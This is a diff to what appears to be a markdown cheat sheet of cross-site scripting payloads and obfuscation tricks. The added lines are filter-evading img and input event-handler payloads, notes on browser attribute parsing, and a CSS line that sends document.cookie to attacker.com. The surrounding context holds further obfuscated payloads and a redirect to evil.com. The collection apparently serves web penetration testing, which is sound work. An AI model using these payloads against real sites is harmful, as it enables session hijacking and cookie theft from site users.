@@ -45,6 +45,8 @@ document.body.appendChild(el);
 
 
 <img src=1 onerror=alert(1)>
+<img src x onerror=alert(1)>
+<img src x onerror alert(1)>
 
 <IMG SRC="jav&#x09;ascript:alert(1)">
 <IMG SRC="jav&#x0A;ascript:alert(1)">
@@ -69,6 +71,8 @@ document.body.appendChild(el);
 
 <svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>
 
+<input autofocus onfocus=alert(1)>
+
 <input type="hidden" accesskey="X" onclick="alert(1)">
 
 <input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
@@ -89,6 +93,7 @@ document.body.appendChild(el);
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
 
 <style>*{background:url("javascript:alert(1)")}</style>
+<style>body{background: url("http://attacker.com?exfil=" + document.cookie);}</style>
 
 <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
 
@@ -143,7 +148,7 @@ constructor.constructor('al'+'ert(1)')()
 ### Obsucations and Tricks
 
 Notes
-
+```
 - tags - `script, img, svg, svg animate `
 - event handlers -  `onerror, onmouseover, onfocus, onblur, autofocus onfocus, onbegin `
 - functions -   `prompt, confirm, window.location("https://evil.com"), print`
@@ -190,9 +195,10 @@ Notes
 - []['filter']['constructor']('alert(1)')() - triggers alert(1)
 - ((()=>{})['constructor']('alert(1)'))() - triggers alert(1)
 - Function.prototype.bind.call(alert, null, 1) This returns a new function equivalent to: () => alert(1), then executes alert(1)
+- The browser interprets src x as src="x". This works because of how browsers parse attributes.
+- The presence of autofocus is enough; no equals sign required.
 
-
-
+```
 #### XSS - Dangling Markup HTML Scriptless Injection
 
 https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html
